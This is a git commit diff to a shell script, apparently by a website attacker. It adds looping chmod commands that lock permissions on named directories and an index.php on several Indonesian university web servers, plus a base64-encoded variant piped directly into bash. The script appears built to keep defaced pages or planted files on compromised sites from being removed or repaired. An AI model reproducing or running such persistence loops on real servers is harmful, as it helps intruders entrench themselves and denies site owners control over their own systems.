e57f38ccc27a8f601139a5d4f665d18ab69b4bdb
haxorqt <83970696+haxorqt@users.noreply.github.com>
2025-03-23 18:11:41 +0700

    Update auto-chmod.sh

--- auto-chmod.sh
+++ auto-chmod.sh
@@ -6,13 +6,21 @@ while true; do
     find "$WATCH_DIR" -type d ! -perm 755 -exec chmod 755 {} \;
     sleep 5
 done
+=================================================================
 
-while true; do find /home/pariwisata/public_html/bulan/ -type f ! -perm 755 -exec chmod 755 {} \;; sleep 5; done
+
+while true; do find /var/www/html/bestjournal.untad.ac.id/pages/sui/ -type d ! -perm 555 -exec chmod 555 {} \;; sleep 2; done
+
+while true; do find /var/www/html/bestjournal.untad.ac.id/index.php -type f ! -perm 444 -exec chmod 444 {} \;; sleep 1; done
+
 
 =================================================================
-VERSI BASE64
+
+VERSI BASE64 :
+
 echo "sZWVwIDE7IGRvbmU=" | base64 --decode | bash
 
 ================================================================
+
 VERSI TERMINAL ONLY
 while true; do find /home/unidayan-informatika/htdocs/informatika.unidayan.ac.id/public/build/iqos/ -type d ! -perm 0111 -exec chmod 0111 {} \;; sleep 1; done
